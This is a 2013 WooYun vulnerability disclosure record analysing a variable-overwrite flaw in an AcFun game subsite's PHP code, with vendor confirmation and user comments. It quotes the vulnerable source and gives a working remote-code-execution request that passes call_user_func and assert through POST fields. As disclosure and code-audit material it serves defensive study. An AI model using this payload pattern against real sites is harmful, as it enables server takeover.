{"id": 11881, "wybug_id": "wooyun-2013-023693", "wybug_title": "ACFUN分站再次GETSHELL变量覆盖漏洞分析与利用", "wybug_corp": "杭州游趣网络有限公司", "wybug_author": "N1ghtBird", "wybug_date": "2013-05-14 08:36", "wybug_open_date": "2013-06-28 08:37", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-28：\t细节向公众公开  简要描述： 最近在学代码审计..找个软柿子下手= 3 =.感谢@t00000by57 提供的利用思路. 详细说明：  但常在河边走哪有不湿鞋？extract + global早晚是要出问题的..直接进入正题：\\include\\common.inc.php -Line12\nrequire GAME_ROOT.'./include/global.func.php';error_reporting(E_ALL);set_error_handler('gameerrorhandler');$magic_quotes_gpc = get_magic_quotes_gpc();extract(gstrfilter($_COOKIE));extract(gstrfilter($_POST));$_GET = gstrfilter($_GET);$_REQUEST = gstrfilter($_REQUEST);$_FILES = gstrfilter($_FILES);//哈?require GAME_ROOT.'./config.inc.php';\n后引入config避免覆盖重要变量.gstrfilter过滤:\\include\\global.inc.php -Line48\nfunction gstrfilter($str) {\tif(is_array($str)) {\t\tforeach($str as $key => $val) {\t\t\t$str[$key] = gstrfilter($val);\t\t}\t} else {\t\t\t\tif($GLOBALS['magic_quotes_gpc']) {\t\t\t$str = stripslashes($str);\t\t}\t\t$str = str_replace(\"'\",\"\",$str);//屏蔽单引号'\t\t$str = str_replace(\"\\\\\",\"\",$str);//屏蔽反斜杠/\t\t$str = htmlspecialchars($str,ENT_COMPAT);//转义html特殊字符，即\"<>&\t}\treturn $str;}\n重要变量靠'现取现用'再加上过滤就可以从一定程度上避免因为偷懒拼接sqlquery产生的问题了..至少在大部分代码中没问题..关键在这里:\\command.php -Line3\nrequire './include/common.inc.php';//$t_s=getmicrotime();//require_once GAME_ROOT.'./include/JSON.php';require GAME_ROOT.'./include/game.func.php';require config('combatcfg',$gamecfg);\n\\command.php -Line92\nif($mode !== 'combat' && $mode !== 'corpse' && strpos($action,'pacorpse')===false && $mode !== 'senditem'){\t\t\t$action = '';\t\t}\t\tif($command == 'menu') {\t\t\t$mode = 'command';\t\t\t$action = '';\t\t} elseif($mode == 'command') {\t\t\tif($command == 'move') {\t\t\t\tinclude_once GAME_ROOT.'./include/game/search.func.php';\t\t\t\tmove($moveto);\t\t\t\tif($coldtimeon){$cmdcdtime=$movecoldtime;}\t\t\t} elseif($command == 'search') {\t\t\t\tinclude_once GAME_ROOT.'./include/game/search.func.php';\t\t\t\tsearch();\t\t\t\tif($coldtimeon){$cmdcdtime=$searchcoldtime;}\t\t\t} elseif(strpos($command,'itm') === 0) {\t\t\t\tinclude_once GAME_ROOT.'./include/game/item.func.php';\t\t\t\t$item = substr($command,3);\t\t\t\titemuse($item);\t\t\t\tif($coldtimeon){$cmdcdtime=$itemusecoldtime;}\t\t\t} elseif(strpos($command,'rest') === 0) {\t\t\t\tif($command=='rest3' && !in_array($pls,$hospitals)){\t\t\t\t\t$log .= '<span class=\"yellow\">你所在的位置并非医院，不能静养！</span><br>';\t\t\t\t}else{\t\t\t\t\t$state = substr($command,4,1);\t\t\t\t\t$mode = 'rest';\t\t\t\t}\t\t\t} elseif($command == 'itemmain') {\t\t\t\t$mode = $itemcmd;\t\t\t} elseif($command == 'song') {\t\t\t\t$sname=trim(trim($art,'【'),'】');\t\t\t\tinclude_once GAME_ROOT.'./include/game/song.inc.php';\t\t\t\t//$log.=$sname;\t\t\t\tsing($sname);\t\t\t}elseif($command == 'sync') {\t\t\t\tinclude_once GAME_ROOT.'./include/game/special.func.php';\t\t\t\tsyncro($sp_cmd);\t\t\t\t$mode='command';\t\t\t}elseif($command == 'special') {\t\t\t\tif($sp_cmd == 'sp_word'){\t\t\t\t\tinclude_once GAME_ROOT.'./include/game/special.func.php';\t\t\t\t\tgetword();\t\t\t\t\t$mode = $sp_cmd;\t\t\t\t}elseif($sp_cmd == 'sp_adtsk'){\t\t\t\t\tinclude_once GAME_ROOT.'./include/game/special.func.php';\t\t\t\t\tadtsk();\t\t\t\t\t$mode = 'command';\t\t\t\t}elseif($sp_cmd == 'sp_pbomb'){\t\t\t\t\t$mode = 'sp_pbomb';\t\t\t\t}elseif($sp_cmd == 'sp_weapon'){\t\t\t\t\tinclude_once GAME_ROOT.'./include/game/special.func.php';\t\t\t\t\tweaponswap();\t\t\t\t\t$mode = 'command';\t\t\t\t\tif($coldtimeon){$cmdcdtime=$weaponswapcoldtime;}\t\t\t\t}elseif($sp_cmd == 'oneonone'){\t\t\t\t\t$mode='oneonone';\t\t\t\t}elseif($sp_cmd == 'sp_skpts'){\t\t\t\t\tinclude_once GAME_ROOT.'./include/game/clubskills.func.php';\t\t\t\t\tcalcskills($skarr);\t\t\t\t\t$p12[1]=1; $p12[2]=2;\t\t\t\t\t$mode='sp_skpts';\t\t\t\t}else{\t\t\t\t\t$mode = $sp_cmd;\t\t\t\t}\t\t\t\t\t\t\t} elseif($command == 'team') {\t\t\t\tinclude_once GAME_ROOT.'./include/game/team.func.php';\t\t\t\tif($teamcmd == 'teamquit') {\t\t\t\t\t\t\t\t\tteamquit();\t\t\t\t} else{\t\t\t\t\tteamcheck();\t\t\t\t}\t\t\t}   //省略一部分..直接进入最后逻辑\t\t} elseif($mode == 'senditem') {\t\t\tinclude_once GAME_ROOT.'./include/game/battle.func.php';\t\t\tsenditem();\t\t} elseif($mode == 'combat') {\t\t\tinclude_once GAME_ROOT.'./include/game/combat.func.php';\t\t\tcombat(1,$command);\t\t} elseif($mode == 'rest') {\t\t\tinclude_once GAME_ROOT.'./include/state.func.php';\t\t\trest($command);//\t\t} elseif($mode == 'chgpassword') {//\t\t\tinclude_once GAME_ROOT.'./include/game/special.func.php';//\t\t\tchgpassword($oldpswd,$newpswd,$newpswd2);//\t\t} elseif($mode == 'chgword') {//\t\t\tinclude_once GAME_ROOT.'./include/game/special.func.php';//\t\t\tchgword($newmotto,$newlastword,$newkillmsg);\t\t} elseif($mode == 'corpse') {\t\t\tinclude_once GAME_ROOT.'./include/game/itemmain.func.php';\t\t\tgetcorpse($command);\t\t} elseif($mode == 'team') {\t\t\tinclude_once GAME_ROOT.'./include/game/team.func.php';\t\t\t$command($nteamID,$nteamPass);//<----------\t\t}\nteam.func.php中存在两个方法,建立队伍function teammake($tID,$tPass)和加入队伍 function teamjoin($tID,$tPass)，依靠$command传来的指令选择，但是感觉像是程序员在偷懒的时候忘记了上面extract解包？   漏洞证明：  构造请求：$_POST['mode']='team'，$_POST['command']='call_user_func'，$_POST['nteamID']='assert'，$_POST['nteamPass']='phpinfo()'。\n\n   修复方案：  别偷懒..   版权声明：转载请注明来源 N1ghtBird@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-05-14 09:19 厂商回复： 已向大逃杀通报 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-14 09:05 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  老搞acfun，等着收offer？    \n     2013-05-14 09:30 |    \t\tN1ghtBird \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:21        | _(:з」∠)_)\t\t \n  人家不要咱...(    \n     2013-05-14 09:53 |    \t\t某因幡 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:7        | 兔子一只。)\t\t \n  猴子表示送香蕉还是送基佬？    \n     2013-06-14 21:12 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  猴基也被暴后庭了..    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}